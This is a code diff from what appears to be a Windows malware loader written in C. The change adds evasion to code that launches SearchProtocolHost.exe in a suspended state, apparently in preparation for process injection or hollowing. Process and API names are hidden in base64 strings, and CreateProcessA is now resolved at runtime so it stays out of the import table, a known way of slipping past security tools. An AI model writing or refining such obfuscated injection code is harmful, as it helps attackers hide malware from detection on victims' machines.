@@ -119,7 +119,15 @@ int main(int argc, char *argv[])
     // SearchProtocolHost.exe
     const char *procName = "U2VhcmNoUHJvdG9jb2xIb3N0LmV4ZQ==";
 
-    if (!CreateProcessA(Bsfd(procPath), NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &sInfo, &pInfo))
+    // Resolve CreateProcessA dynamically
+    pCPA_t pCPA = (pCPA_t)GetMod(Bsfd("a2VybmVsMzIuZGxs"), Bsfd("Q3JlYXRlUHJvY2Vzc0E="));
+
+    if (!pCPA) {
+        printf("[!] Failed to resolve CreateProcessA\n");
+        return -1;
+    }
+
+    if (!pCPA(Bsfd(procPath), NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &sInfo, &pInfo))
     {
         myDebug(DEBUG_ERROR, "Could not create %s. Err: %lu", procName, GetLastError());
         return -1;
